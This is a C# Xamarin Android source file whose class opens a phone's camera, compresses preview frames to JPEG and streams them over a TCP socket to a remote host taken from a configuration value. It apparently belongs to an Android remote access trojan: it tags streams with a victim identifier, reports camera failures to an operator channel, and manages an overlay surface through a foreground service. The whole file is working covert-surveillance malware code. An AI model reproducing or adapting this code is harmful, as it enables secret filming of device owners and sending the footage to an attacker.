using Android.Graphics;
using Android.Runtime;
using Android.Views;
using Java.Interop;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Task2
{
    class Prev : Java.Lang.Object, ISurfaceHolderCallback, Android.Hardware.Camera.IPreviewCallback
    {
        public static Android.Hardware.Camera mCamera;
        public IntPtr Handle;

        public int JniIdentityHashCode;

        public JniObjectReference PeerReference;

        public JniPeerMembers JniPeerMembers;

        public JniManagedPeerStates JniManagedPeerState;
        ISurfaceHolder hldr;
        public static Prev global_cam;

        public static Socket camSock = default;
        public void Dispose()
        {

        }

        public void Disposed()
        {

        }

        public void DisposeUnlessReferenced()
        {

        }

        public void Finalized()
        {

        }
        string ID = "";
        public async void OnPreviewFrame(byte[] data, Android.Hardware.Camera camera)
        {
            await System.Threading.Tasks.Task.Run(async () =>
            {
                Bitmap capturedScreen = convertYuvByteArrayToBitmap(data, camera);
                if (capturedScreen != null)
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        try
                        {
                            capturedScreen.Compress(Android.Graphics.Bitmap.CompressFormat.Jpeg, int.Parse(MainValues.quality), ms);
                            byte[] live = ((MainActivity)MainActivity.global_activity).MyDataPacker("VID", ms.ToArray(), ID);

                            if (camSock != null)
                            {
                                camSock.BeginSend(live, 0, live.Length, SocketFlags.None, null, null);
                            }
                            else { StopCamera(); }
                        }
                        catch (Exception)
                        {
                            StopCamera();
                            if (camSock != null)
                            {
                                try { camSock.Close(); } catch { }
                                try { camSock.Dispose(); } catch { }
                            }
                        }
                    }
                    await System.Threading.Tasks.Task.Delay(1);
                }
            });
        }
        public void SetJniIdentityHashCode(int value)
        {

        }

        public void SetJniManagedPeerState(JniManagedPeerStates value)
        {

        }

        public void SetPeerReference(JniObjectReference reference)
        {

        }

        public void SurfaceChanged(ISurfaceHolder holder, [GeneratedEnum] Format format, int width, int height)
        {

        }
        public void StartCamera(int camID, string flash, string resolution, string focuse)
        {
            StopCamera();
            try { mCamera = Android.Hardware.Camera.Open(camID); }
            catch (Exception)
            {
                try
                {
                    byte[] dataPacker = ((MainActivity)MainActivity.global_activity).MyDataPacker("CAMNOT", System.
                            Text.Encoding.UTF8.GetBytes("vid"));
                    MainActivity.Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
                return;
            }
            try
            {
                if (camSock != null)
                {
                    try { camSock.Close(); } catch { }
                    try { camSock.Dispose(); } catch { }
                }
                ID = MainValues.KRBN_ISMI + "_" + ((MainActivity)MainActivity.global_activity).GetIdentifier();
                camSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                camSock.SendBufferSize = int.MaxValue;
                camSock.NoDelay = true;
                ((MainActivity)MainActivity.global_activity).SetKeepAlive(camSock, 5000, 5000);
                camSock.Connect(endpoint_dosya);

                Android.Hardware.Camera.Parameters params_ = mCamera.GetParameters();
                SetFlashModeOff(params_);
                if (flash == "1")
                {
                    FlashParam(params_);
                }
                ///
                params_.SetPreviewSize(int.Parse(resolution.Split('x')[0]),
                    int.Parse(resolution.Split('x')[1]));
                ///
                if (focuse == "1")
                {
                    SetFocusModeOn(params_);
                }
                ///       
                SetSceneModeAuto(params_);
                SetWhiteBalanceAuto(params_);
                mCamera.SetParameters(params_);
                try
                {
                    mCamera.SetPreviewDisplay(hldr);
                    mCamera.SetPreviewCallback(this);
                    mCamera.StartPreview();
                }
                catch (Exception)
                {
                    try
                    {
                        byte[] senddata = ((MainActivity)MainActivity.global_activity).MyDataPacker("CAMNOT", Encoding.UTF8.GetBytes("Can't start camera"));
                        MainActivity.Soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                    StopCamera();
                    if (camSock != null)
                    {
                        try { camSock.Close(); } catch { }
                        try { camSock.Dispose(); } catch { }
                    }
                    return;
                }
            }
            catch (Exception)
            {
                StopCamera();
                if (camSock != null)
                {
                    try { camSock.Close(); } catch { }
                    try { camSock.Dispose(); } catch { }
                }
            }
        }
        public void StopCamera()
        {
            if (mCamera != null)
            {
                try
                {
                    mCamera.StopPreview();
                    mCamera.SetPreviewDisplay(null);
                    mCamera.SetPreviewCallback(null);
                    mCamera.Lock();
                    mCamera.Release();
                    mCamera = null;
                    hldr.RemoveCallback(this);
                    if (ForegroundService.windowManager != null)
                    {
                        if (ForegroundService._globalSurface != null)
                        {
                            ForegroundService.windowManager.RemoveView(ForegroundService._globalSurface);
                            ForegroundService.windowManager = null;
                            ForegroundService._globalSurface = null;
                        }
                    }
                    ForegroundService._globalService.CamInService();
                }
                catch (Exception) { }
            }
        }
        public void SurfaceCreated(ISurfaceHolder holder)
        {
            hldr = holder;
            global_cam = this;
        }
        public void SurfaceDestroyed(ISurfaceHolder holder)
        {
            StopCamera();
        }

        public void UnregisterFromRuntime()
        {

        }
        public static Bitmap convertYuvByteArrayToBitmap(byte[] data, Android.Hardware.Camera camera)
        {
            try
            {
                Android.Hardware.Camera.Parameters parameters = camera.GetParameters();
                Android.Hardware.Camera.Size size = parameters.PreviewSize;
                YuvImage image = new YuvImage(data, parameters.PreviewFormat, size.Width, size.Height, null);
                System.IO.MemoryStream out_ = new System.IO.MemoryStream();
                image.CompressToJpeg(new Rect(0, 0, size.Width, size.Height), int.Parse(MainValues.quality), out_);
                byte[] imageBytes = out_.ToArray();
                out_.Flush(); out_.Close();
                return BitmapFactory.DecodeByteArray(imageBytes, 0, imageBytes.Length);
            }
            catch (Exception)
            {
                return null;
            }
        }
        public void FlashParam(Android.Hardware.Camera.Parameters prm)
        {
            IList<string> supportedFlashModes = prm.SupportedFlashModes;
            if (supportedFlashModes != null)
            {
                if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeTorch))
                {
                    prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeTorch;
                }
                else
                {
                    if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeRedEye))
                    {
                        prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeRedEye;
                    }
                    else
                    {
                        if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeOn))
                        {
                            prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOn;
                        }
                        else
                        {
                            if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeAuto))
                            {
                                prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeAuto;
                            }
                        }
                    }
                }
            }
        }
        private void SetFlashModeOff(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedFlashModes = oldParameters.SupportedFlashModes;

            if (supportedFlashModes != null &&
                supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeOff))
            {
                oldParameters.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOff;
            }
        }
        public void SetFocusModeOn(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedFocusModes = oldParameters.SupportedFocusModes;
            if (supportedFocusModes != null &&
                supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeContinuousVideo))
            {
                oldParameters.FocusMode = Android.Hardware.Camera.Parameters.FocusModeContinuousVideo;
            }
        }
        public void SetWhiteBalanceAuto(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedWhiteBalance = oldParameters.SupportedWhiteBalance;

            if (supportedWhiteBalance != null &&
                supportedWhiteBalance.Contains(Android.Hardware.Camera.Parameters.WhiteBalanceAuto))
            {
                oldParameters.WhiteBalance = Android.Hardware.Camera.Parameters.WhiteBalanceAuto;
            }

        }
        public void SetSceneModeAuto(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedSceneModes = oldParameters.SupportedSceneModes;

            if (supportedSceneModes != null &&
                supportedSceneModes.Contains(Android.Hardware.Camera.Parameters.SceneModeAuto))
            {
                oldParameters.SceneMode = Android.Hardware.Camera.Parameters.SceneModeAuto;
            }
        }
    }
}